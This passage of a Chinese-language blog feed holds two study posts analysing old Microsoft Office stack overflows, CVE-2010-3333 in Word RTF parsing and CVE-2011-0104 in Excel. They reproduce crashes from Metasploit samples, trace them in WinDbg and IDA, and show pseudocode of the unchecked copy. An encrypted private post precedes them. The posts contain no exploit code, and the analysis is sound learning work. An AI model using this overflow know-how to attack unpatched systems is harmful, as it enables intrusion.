31fe6b204d03d36b50038d2ad748b5d9b9b0053a307207e974039e3926ec353087e209d92c904df8fbebdb30fa3b12413655d46cd14d0c751918b1d2699459f451bbbfd944f82011eefb1aab4b12e1a8a511c42be8485eeed5b04d31e93bd996f224c27e3f1db44d417ceb742bf83c0a7a78856db1292db9c77d68ed5d4b138c11a8008515221e7226ffccd15873b1b4d523ade8f8ac15a15d6aa4c6e00b962a1c16cd0e176f706540b5af97c125f09ac7caa7a4f206620988761c87c4b109cfdfde6f52a0436c03ee648dd48a141fe773e36c7dcee95ad2d6eb3d6819b02c127dad3a996e3711d81264bb895c1652fc0f666d24cf67c80858ed1d08edf5b8236587a363a23b790def12e73631be92df1c4357cca56afa993290f680aa54e2a07d5e13b83e605bf647e711aa1a72ba2318107e1e15f6ccf70b0b05dee0ec56905a815660bb72c55ef422c4d2a645df68e95e99ce5d05602b755e971aa090b0ab7f8a76f665b399b7e871e0416538f45b8d440c38d5eb7ccd5937e3b1364e4126d702155e5ed99f32deeebdae0218510055fc39394dffef3e33ed64f3b552cc5bea4abc2aa1c6773f3e1226e3d1cdca3f9c5c2ee4fd4e60f1cc88f58358a621bc6bf2cdec23671347894361e4742c3a4faf2478b3ff27b0776a7d50f427eb3f5fd41023e96d941b34b60708b80da8f6a5a479d8ec75596826415128b72b838cf33bd211fa37dd3a5b154bf8f5e8e4eb85daf47dc3ceeea9f9d6ed8dbd5f3f9d527af98e474f0e4c46eebbd034f155447e2bd4fcfd9d1233cc83afbb050a7352241a63a3618f1a75096d575ba776c9d74b1c83bacfeabf92d45db456ab99dcf253036674606126c355adccb8887d909e4d481e06f5283da0423b5fa43c553f9d589ea46cbc500c1a55cfa1388eeec59ccb9fa6962c96ed61ca589617d87a57fcec135daebda8f5cab0885f6cee17ebbfd6bcde0c3a8883484dcb96f9272058b0f71331a149055d78110499bee9138abc5965a64f242a2228ad08f8da8e84567c694fee62f08e551e6cbc1f5157973fc50bee9e3cb2a5315740d022048c14c21cc149a8a397f722dd0251fd815c4e72c41d56a9328f7b08f3336f5f56d75b3058d2c292bfddfafc622d9fb2c7d378a6deb0527415431a7a424ff82fbb4d9e9d082074042aa89f95761df3cfc278b40b67cf0e915080ec45ade9fa4fe5f0c6a1d8cca7bec98670d76483c8d4227b58d477bc8bbc414f2f2233c09b55d80a31569f08c333dc12bf10df85432854ed8b71402cc99d64aa17ed0558cae470dab3cb1ef950810d8d0f640a67483910687944d968096bf361f7cf8aa6690370979be0dc4f81f7481930a0f49c1e984743fb0d37620dc542a41e8b1821ca04ce9381d454331ecc369b27209109d314a6c843ed3b2e6eae2a6d7485ba2f37972883a7de9ed3b2433f2d6dc29cd67597601ff46742cf56a064cabd408a66677ef97534495b59c2794b5462308703a36452a1e0345b7d8b20ea1c0ee509f111ba46b518ba928c36fcd0c4553b13811a4d678083732a81f817978f1016d9a03884bccf8dbd7d8714c6f4945c045a4b197dd28d8f7e9dc7a567306e282ccf4aaf3662422757ae87c723f5be44ce2fb9d4693d113f5d9a40e68460941e9d66f97605e377e484648df282d413566d171e9930f80bc0503c8616849b6baf0bac1dca3105280fccbaf21cb76d3f465f2896a543056d13c692e04127dba83d1424a34b2e4fc75213e42b559de6864270025dccc2a8218670016fc58eb85a590919805a25745e5613ae904736826ba44c7bcdc8b7f1a274c35f9e6bafbe11e8fb3e378ea6e3c38457af2c75bfb2464594610cc092772f48945b0e65a14ba7181c167cc548a3638136e4bbd9a048887c59fc09c365f5d088855967a43bf914478d2991f1708d612fbd633f121c1f1ec6e8fb19bc7d40b3cec3969e5da066a4bc4afa14e10db598015f303d7992b6b89894f3713b8b64cac5e9ca94944a7f2455e2306a2da2172559c8684502158f731ad9fa90cd0dd0c1c4349b5a3dae6b3248999235a3daa8f8d3b28a370d53f5d86e679bc86fb0699516e0004b6e14ba0f511699e5bbd61b4b5cdd968a21974699d2b1c62ec721aeb5827238f7ff0c062f3c3c6907ce224060fcdf7153b473d29144d524e813621d873169977997dabb82b137a6a223cb4e3cb2b20123a0ca54335e3a793c6d9a3b72a1dbf1b84cec906673287ee1fd3fa7d7a2d2a7f24b27c8bec8ece99dd1802349e8a532298a7dcdd26d551b8be8eb4c4938b0fe0b49bb1bcc84359e9d309dedbe6ff6090f9a2025882663ba89d2d42a0ea58198e04b16e549d3c68194b263cb9fb6840342360e706cf3f1a03ba1f585324e3e26a587d492f654306b097df7f88bee0b32691779577a1a87d60c7628b52a7d586868d70a8c9a7f2bd01eadb5145856d4eda78bcbe99713db2e41c8b79f701b8c0d1f8e922ab023e37bbb695562401166a15f6d11dc3225930fb8cf4bab3c09463b4296175a0b2c2357ab36e33c6d461626dc9824d5c0542afc3d3d9332bce5d08d1ddee01088724245ae46ce362d3827c337e500c6ee33d008218b95e7e063516ad34f581290c39df751279f11f4e8d5cc877570b744dade3c5de89749f91afd72e4e9df57d30bcc372672c92ce39c05a57b98777d49450192e689756adb37ebdb117a2eb2c6300bc1c529694d4ce84e289151829e63b32f495fad0a283f3317b288982772950ca8c5252839ac4d5267cd52bea22b8cb64842bc0d99b409b51d5c08a7a99a4212b0853dcdc767d771e93b36ed07726c40cabd88797bcfcddeb0689eb0683ae6b67dc0ae05772a4961f2fb3d56eaa1612f6c113cdaecfc8c84fee17c2426fda2f309c28c6187eaf1e5dc28b484295c9c7ad862e153f0b1fc22c6bdf39ffb82ebff572822928f86f03a340d40ab63b7eac9208b4c680f266e18f1471462ded7019c5707425c77f0b2e654e5e203d949ef95dccd364f4574f374a1e1a2544a4027eab43721d01fc82a449d17654139f5f2577dcf51b7a34086d0a39e7bc1281b1bef6cee80e52f7b4dd660b784fb596daeefd84171bfddd74c745e5f12278b0ef74d1ec7d5f25e00eb921ddf12519de9083e5aeddf2581f98737f40a521fda46d1e8e440831434f9b575b0c15392e3c5cfca34670df9145a5c54322e6773519c80b4bac2941a909a676e8ee6f503e5259a5a1fd6eba11192fdddc99b6daca7da5a1a0cac28fcdffba087ffc8ee96d8480d829e496ad3255f8c9dd8d41d647ee23ea88758335557d9f27676bd2533a20828147b3832badc30a5c3f2902422e11bfb2d3b4f52da55d9a6a2eaff9750def9399482c8537da74ba3d1bf367d13a40d9309b72dfb71e1a16a2d2bedcca7f6e01d464d20d6dc38257bf6539283e3f4999590526eef50ca71216643c33cb918bf8ee9ef74470dd67fd6d672be1376b3f0c89ec7f9042ac98d1a0a5b551bf4fd82b8c989ccebd495a044050950f3a5456524e4d45f48b4547d695d2ba479431cf8fb016104e0cb23ae00c254616b0ef29c9cc2f175582f14eb94fef18f6aab6e799ae99c5b2d11c3ff691dd5d3d33a19014d0ec98fa8ee8d47ffb7cf6718cd9387bd683733821539a911a7e401cfef7ed4fd95ed551b729a82908695039d39b042670fa71c04ea405671faadd936e9e152576bcf0b288bc37824dd322356da1434f2fd923288d3caeaa04018aadb6005bf34166918d1ff552493eda1c22d4bcfeea14d84b5040d081ccce079f06c932e0c7483d6567f6dc118a4d19d9e8d4da0be41b48a25a75099f8e39cf0b19a1fc910c55e1f5a41d5d3d22c1ef30ee5d55c9a334fe1c73608a88c457f2a01838b2952e7ad110aa1dd7e940e295a2e48541044608ef3b1441f7edb2ee825d7c1b6b105bcf40a603e3808c959792a0a650b5090622dae304146d985bd6aa1d094e5039d08a3d0a02600ff48797e837f61b494d96a6020b035dcdcfc023e45155f658d2fe990cc243542f7af25929d034923eb57f30542ca46aa1294590fdda5b06533527da52b811058e4b752b4e6cd0a7993bd2e2346356b3bf3ab61a389a2d40f533531cfa7f1d60604be7241797b6040cf952864992228e92e3ffa3d5c870671fd32e84b2e56893d208fee1d821fafabfc60543320fc080e19db1b42499112c0a8e5d8feb6f913c7c247e20c6a64956e3206b0d18de84c5395e70eff46c0440bf8fa932735f8d95847f42ee5f5ec7f6caa42aa5f584adbacf08e6a6f6b84a4406b5b8b8bd5c5aa23df8670a10bcddd44b1e89070aac03dea1b5eb6897e5609adfeee6f3306e59cbb12ea9ab7cc00d157c964d5121ee913c7d3a2e9dc28d0a7608365bf09fd5e766c3677dce559bc79a1cfeea5178b3bdeafcc31c0c91be50f0494bee7057a64c00b0f0add38f7ea599b5142808d7c1b885607377d525ee8525d161040895a9960dc676a017d8799a95f392202dad48396e07565588671df18e0e127d506f1150579d3ad33d3b22682b5fe9cecddbb4265ecb83fc11d7a8046d54084c212e8d4fd018d9fe4f897676acf686579e89c79606a00d78a4c8b65b2bd7755d73be58740650805f3dfd21d8988faa92b9206e0174ad77ace0bafda11ac7253969fd9d9e02cbc1353aa510844496d6cb21983836a4394ee0516ff1584a1c52edc0ede04df8a88a23e12d241ee202dc382c95d9430b030cf3e024a14543f53974db447846389410856428da20d747f6e083bf6f7c0143374782c50849f65c75ff0b0140342470cf8e2062ee70802e20d87deaa2c65e737e80cd66f245cd1ec95216441915b43f228569001cebd938fec857ce5500d3422a1faaca8bc3c6ee19fcdb0af5230eab5cccad2688204e6d8f4a2728dba3ea490947c2d69ba5f0dc36808036cfe7f3c6ecf8fa91d3608918a052328cc2aefd6d9df7ab6c2c7f3b2b05bce7172143db9b15afae79294ac1ea6cb1a7a149d2259b19b3736cb8f9c5052c5ed824db02b7ff9f4d6cde0622e227c11259f21c6cf3c4e7445202fade0bd22e795614e45935cea83857134e9672779f510203e180f10efdd3d75c0d5edfa0814d901f063d587e8c45472eaa2930b8c0a19662f8d2472ce6d17f3253816559f5f4ff63a2cce7d2bed8c3abc5b904623d49d763aacb32a67eb516172cb7011660e4a6ce411365e4914052ab29aa3d1909e9737045d0496d0739f9a9a1655a11f890869283aadb13c5deae5f5256c72f3fe3e6da19703bf46bff6ed9fdfb3fc31f7f30ca5b2bad1a66dba084e110e2ead08f449bc9105899c616d55a1f47761bf70c1cf72777c7f963570fa54e95316c26a39ab6da3b8daa5c97e41b01b58f25337a2c344fc134e798c8d7a1f786150bd3394525bcce2f70c21656343c006c2d5b16bb3f899d08b78e2d8a95f384b1dff11156bfc9fd52f57e859fb725d1db636cbdf9339ffe76ff4aa8da2ca445f9b64174bd397dff4d4f280508b1208299d3f1a43918f4ee7b1fc3f5fcd193551cefc70f5bce668181a3c15abb1c3318b59d33ab878e6f9b0e25ebd57f1b057383dd3b765853e27b8305bea46c3399d9a8086b5150d7aa3ff8b5fc</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">如果你觉得我会告诉你的话就私聊我吧</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>莫名其妙的记录</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2010-3333</title>
    <url>/47243.html</url>
    <content><![CDATA[<p>本来打算只看看书，跳过调试的环节，结果在下一章堆漏洞讲到了分析这个漏洞时用到的栈回溯，所以又回来了2333</p>
<span id="more"></span>
<table>
<thead>
<tr>
<th>项目</th>
<th>版本</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>Windows XP SP3</td>
</tr>
<tr>
<td>调试器</td>
<td>windbg 6.12</td>
</tr>
<tr>
<td>漏洞软件</td>
<td>word 2003 (11.5604.5606)</td>
</tr>
</tbody>
</table>
<p>注：虽然漏洞好像在XP SP3上都有，但是metasploit生成的crash样本在高于11.5604的word上不一定能用（之前调试CVE-2011-0104用的那个office就8行，直接成功把样本打开了…）这个版本找了好久orzz</p>
<h1>漏洞描述</h1>
<p>Stack-based buffer overflow in Microsoft Office XP SP3, Office 2003 SP3, Office 2007 SP2, Office 2010, Office 2004 and 2008 for Mac, Office for Mac 2011, and Open XML File Format Converter for Mac allows remote attackers to execute arbitrary code via crafted RTF data, aka “RTF Stack Buffer Overflow Vulnerability.”</p>
<h1>复现过程</h1>
<p>用metasploit生成poc。<br>
感觉metasploit在windows上不太好使，后来想起来kali自带了这个…</p>
<p>获得poc后打开word，windbg attach，加载poc触发异常一条龙</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210512215446.png" alt="20210512215446"><br>
windbg查看寄存器信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这一步需要符号文件，没有配置过的话可以参考下面两个链接</span><br><span class="line">https://bbs.pediy.com/thread-251052.htm</span><br><span class="line">https://www.cnblogs.com/csnd/p/11800535.html</span><br></pre></td></tr></table></figure>
<p>发现edi指向了一个只读的区域<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210512215515.png" alt="20210512215515"><br>
所以应该还是在循环复制的时候没有检查长度（似乎好多古老的栈溢出都是因为这个）</p>
<p>在异常处下断点，bp 30e9eb88，重新加载<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210512220932.png" alt="20210512220932"><br>
命令k查看栈回溯<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210512222342.png" alt="20210512222342"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">windbg查看反汇编代码指令：</span><br><span class="line">u .  // 反汇编当前eip寄存器地址的后8条指令</span><br><span class="line"></span><br><span class="line">u $eip  // 反汇编当前eip寄存器地址的后8条指令</span><br><span class="line"></span><br><span class="line">ub .  // 反汇编当前ip寄存器地址的前8条指令</span><br><span class="line"></span><br><span class="line">ub $eip  // 反汇编当前eip寄存器地址的前8条指令</span><br><span class="line"></span><br><span class="line">u main+0x29 L30 // 反汇编main+0x29地址的后30条指令</span><br><span class="line"></span><br><span class="line">u  // 反编译下8条指令</span><br><span class="line"></span><br><span class="line">uf CTest::add  // 反汇编CTest类的add函数</span><br><span class="line"></span><br><span class="line">uf /c main  // 反汇编main函数，通过/c可以查看main函数中的函数调用(call)都有哪些</span><br><span class="line"></span><br><span class="line">ub 000c135d L20  // 查看地址为000c135d指令前的20条指令内容</span><br></pre></td></tr></table></figure>
<p>查看后续的指令和栈中的内容。连着两个pop然后ret，返回到调用漏洞代码的指令的下一指令，即0x30f4cc96<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210513182456.png" alt="20210513182456"></p>
<p>在ida里查看，可以发现该指令位于函数sub_30F4CC5D<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210513184917.png" alt="20210513184917"><br>
并且函数有三个参数。因为是32位程序，使用栈传递参数，涉及到的三个push指令分别与[ebp+arg_4]（在后续的子函数中赋给edi，如下图2）、ecx、esi有关<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210513200611.png" alt="20210513200611"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210513210636.png" alt="20210513210636"></p>
<p>先记录一下，这条call指令位于sub_20F4CC5D的30F4CC93，调用了sub_30E9EB62的30E9EB88（即溢出点）<br>
而我们要回溯它用到的三个参数。第一个很直白；2、3需要再分析</p>
<p>先看esi，esi=[eax+64h]，注意到有一个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:30F4CC75                 call    sub_30D2810C</span><br></pre></td></tr></table></figure>
<p>进入看到这里是最后修改eax的位置<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210513211641.png" alt="20210513211641"></p>
<p>再看ecx，在sub_30E9EB62中：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210513212959.png" alt="20210513212959"></p>
<p>在30F4CDB0中可以看到，eax=[ebp+arg_0]</p>
<p>综上得到：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210513213522.png" alt="20210513213522"></p>
<p>在windbg中再次调试可以验证静态分析得到的传参过程，没截图，略</p>
<pre><code>整体思路：由崩溃点确定漏洞触发位置——&gt;回溯调用栈——&gt;分析参数如何计算及传递。
</code></pre>
<p>参考：<br>
<span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2h4ZnFnOS9iaW4vaHp5eHZr">https://www.yuque.com/hxfqg9/bin/hzyxvk<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNjM5OTguaHRt">https://bbs.pediy.com/thread-263998.htm<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <tags>
        <tag>Win漏洞分析</tag>
        <tag>漏洞战争</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2011-0104 漏洞分析</title>
    <url>/3418.html</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th>项目</th>
<th>版本</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>WindowsXP SP3</td>
</tr>
<tr>
<td>调试器</td>
<td>windbg 6.12、OD 1.10</td>
</tr>
<tr>
<td>漏洞软件</td>
<td>Office Excel 2003 SP3</td>
</tr>
<tr>
<td>反编译器</td>
<td>IDA 6.1</td>
</tr>
</tbody>
</table>
<p>注：随书文件中的excel在干净的系统中直接打开会显示“操作系统当前的配置不能运行此程序”，需要先安装一个Office</p>
<span id="more"></span>
<h2 id="复现过程">复现过程</h2>
<p>打开Windbg，加载excel，再打开exploit文档</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210425182432.png" alt="20210425182432"></p>
<p>此时Windgb会捕捉到发生在excel.exe中异常，ds:eax指向了一个无效的地址。用kb查看一下栈中的数据，可以看到栈内的数据都被覆盖了。</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210425184839.png" alt="20210425184839"></p>
<p>同时，用ida可以知道异常处所在的函数为sub_300E05AD</p>
<p>用od打开新的excel程序，并在函数入口和异常处下断点，然后加载exploit文件</p>
<p>当程序在函数入口暂停的时候，程序进入了一个新函数，对这个函数的栈顶设置内存写入断点后运行，就可以定位到导致栈溢出的代码</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210425191231.png" alt="20210425191231"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注：书中写到，exploit是对excel 2007 sp2 写的，因此覆盖到栈顶的是shellcode而不是跳板（所以可以考虑用该版本的excel调试？2333）。嗯 就继续按照书里的来吧</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在ida查看此处的汇编代码，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">....</span><br><span class="line"></span><br><span class="line">.text:300DE825                 lea     esi, dword_3088EC40[edx]</span><br><span class="line">.text:300DE82B                 mov     ecx, eax        ; ecx=eax=复制的字节数</span><br><span class="line">.text:300DE82D                 mov     edx, ecx</span><br><span class="line">.text:300DE82F                 shr     ecx, 2          ; 以dword位单位进行复制，所以/4</span><br><span class="line">.text:300DE832                 mov     edi, ebp</span><br><span class="line">.text:300DE834                 rep movsd               ; 溢出点</span><br></pre></td></tr></table></figure>
<p>接着找到该段代码所属的函数，并用OD在函数起始处下断点，重新运行程序</p>
<p>运行+一点点分析，可以发现这个函数调用了两次（至少），而溢出发生在第二次<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210425220650.png" alt="20210425220650"></p>
<p>总共复制了0x300个字节，0x300即“污点”</p>
<p>通过查看调用栈或ida的交叉引用，定位到调用vulfun的函数</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210425221948.png" alt="20210425221948"></p>
<p>查看vul_func反汇编代码:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __userpurge VulFun&lt;eax&gt;(<span class="keyword">void</span> *a1&lt;ebp&gt;, <span class="keyword">void</span> *a2, <span class="keyword">signed</span> <span class="keyword">int</span> a3, <span class="keyword">unsigned</span> <span class="keyword">int</span> a4)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// ebx@1</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// edx@3</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// eax@3</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// eax@5</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax@8</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v9; <span class="comment">// eax@12</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a3 &gt; a4 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_300DD5A6(dword_3088DF34, <span class="number">6</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = dword_30892C44;</span><br><span class="line">    v6 = *(_DWORD *)&amp;NumberOfBytesWritten;</span><br><span class="line">    a1 = a2;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 &gt;= v6 )</span><br><span class="line">      &#123;</span><br><span class="line">        v9 = v4;</span><br><span class="line">        <span class="keyword">if</span> ( v4 &gt; <span class="number">16384</span> )</span><br><span class="line">LABEL_15:</span><br><span class="line">          v9 = <span class="number">16384</span>;</span><br><span class="line">        sub_3011A989(v9);</span><br><span class="line">        v5 = dword_30892C44;</span><br><span class="line">        v6 = *(_DWORD *)&amp;NumberOfBytesWritten;</span><br><span class="line">      &#125;</span><br><span class="line">      v7 = v6 - v5;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &lt; (<span class="keyword">signed</span> <span class="keyword">int</span>)v7 )</span><br><span class="line">        v7 = v4;</span><br><span class="line">      <span class="built_in">memcpy</span>(a1, &amp;dword_3088EC40[v5], v7);</span><br><span class="line">      v4 -= v7;</span><br><span class="line">      v5 = v7 + dword_30892C44;</span><br><span class="line">      a1 = (<span class="keyword">char</span> *)a1 + v7;</span><br><span class="line">      dword_30892C44 += v7;</span><br><span class="line">      <span class="keyword">if</span> ( !v4 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v6 = *(_DWORD *)&amp;NumberOfBytesWritten;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( *(_DWORD *)&amp;NumberOfBytesWritten == <span class="number">16384</span> );</span><br><span class="line">    result = a1 - a2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到一个memcpy…</p>
<p>再向上看看，发现v7的变化是从这个片段中的子函数来的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v94 == <span class="number">167</span> )                     <span class="comment">// 判断recode type是否为0xA7</span></span><br><span class="line">&#123;</span><br><span class="line">  v9 = (<span class="keyword">int</span>)((<span class="keyword">char</span> *)v7 + v6);</span><br><span class="line">  v10 = dword_30895B44 &lt; <span class="number">5</span>;</span><br><span class="line">  LOBYTE(v10) = dword_30895B44 &gt;= <span class="number">5</span>;</span><br><span class="line">  v98 = (<span class="keyword">int</span>)((<span class="keyword">char</span> *)v7 + v6);</span><br><span class="line">  LOWORD(v9) = *(_WORD *)((<span class="keyword">char</span> *)v7 + <span class="number">1</span>);</span><br><span class="line">  v81 = *(_WORD *)((<span class="keyword">char</span> *)v7 + <span class="number">1</span>);</span><br><span class="line">  v11 = <span class="number">2</span> * v10 + <span class="number">2</span>;</span><br><span class="line">  v12 = (<span class="keyword">int</span>)((<span class="keyword">char</span> *)v7 + v11 * v81 + <span class="number">3</span>);</span><br><span class="line">  v92 = v9;</span><br><span class="line">  i = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">char</span> *)v7 + <span class="number">3</span>);</span><br><span class="line">  v96 = v11;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> __int16)v9 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      --v92;</span><br><span class="line">      v13 = i;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v14 = v93;</span><br><span class="line">        <span class="keyword">if</span> ( dword_30895B44 &gt;= <span class="number">5</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v97 = *(_DWORD *)v13;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          LOWORD(v97) = *(_BYTE *)v13;</span><br><span class="line">          HIWORD(v97) = *(_BYTE *)(v13 + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( (_WORD)v97 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v13 += v96;</span><br><span class="line">        v15 = v92--;</span><br><span class="line">        v93 = <span class="number">1</span>;</span><br><span class="line">        i = v13;</span><br><span class="line">        <span class="keyword">if</span> ( !v15 )</span><br><span class="line">        &#123;</span><br><span class="line">          v14 = v93;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( HIWORD(v97) &amp; <span class="number">0x12F</span> &amp;&amp; v12 &gt;= (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v98 )</span><br><span class="line">      &#123;</span><br><span class="line">        v94 = sub_300DE7C5();         <span class="comment">// v93 = 0x3C</span></span><br><span class="line">        <span class="keyword">if</span> ( v94 != <span class="number">0x3C</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_187;</span><br><span class="line">        v16 = sub_300DE7C5();         <span class="comment">// 返回复制字节数0x300</span></span><br><span class="line">        v17 = v96 * v81;              <span class="comment">// v80 = 0x0C0F,v95 = 0x4</span></span><br><span class="line">        v98 = v16;</span><br><span class="line">        v12 = (<span class="keyword">int</span>)((<span class="keyword">char</span> *)v95 + v96 * v81 + <span class="number">3</span>);</span><br><span class="line">        v18 = sub_300C3AA4();</span><br><span class="line">        VulFun(v5, (<span class="keyword">void</span> *)v12, v98, <span class="number">-3</span> - v17 + v18);</span><br></pre></td></tr></table></figure>
<p>sub_300DE7C5</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">t __cdecl <span class="title">sub_300DE7C5</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ecx@1</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@2</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// esi@5</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ecx@5</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax@6</span></span><br><span class="line"></span><br><span class="line">  v0 = *(_DWORD *)&amp;NumberOfBytesWritten;</span><br><span class="line">  v1 = dword_30892C44;</span><br><span class="line">  <span class="keyword">if</span> ( dword_30892C44 &gt;= *(_DWORD *)&amp;NumberOfBytesWritten - <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( dword_30892C44 &gt;= *(_DWORD *)&amp;NumberOfBytesWritten )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_3011A989(<span class="number">1</span>);</span><br><span class="line">      v1 = dword_30892C44;</span><br><span class="line">      v0 = *(_DWORD *)&amp;NumberOfBytesWritten;</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = dword_3088EC40[v1];</span><br><span class="line">    v4 = v1 + <span class="number">1</span>;</span><br><span class="line">    dword_30892C44 = v4;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt;= v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_3011A989(<span class="number">1</span>);</span><br><span class="line">      v4 = dword_30892C44;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    *(_WORD *)((<span class="keyword">char</span> *)&amp;v5 + <span class="number">1</span>) = dword_3088EC40[v4];</span><br><span class="line">    dword_30892C44 = v4 + <span class="number">1</span>;</span><br><span class="line">    result = v5 | v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_WORD *)&amp;dword_3088EC40[dword_30892C44];</span><br><span class="line">    dword_30892C44 += <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实是直接复制并使用了样本文件中CONTINUE的Len字段的值，没有进行判断</p>
<h2 id="后记">后记</h2>
<p>在网上查了一下污点追踪，大概是一个定位漏洞的方法，感觉这个方法确实挺常用的（吧）。另外，找到了一篇武大的基于污点追踪的嵌入式固件漏洞研究的论文。<br>
感觉这两次复现对于调试能力的提升还是很大的，但总是研究到漏洞的触发就感觉差不多了，至于shellcode和修复就没太想继续研究…</p>
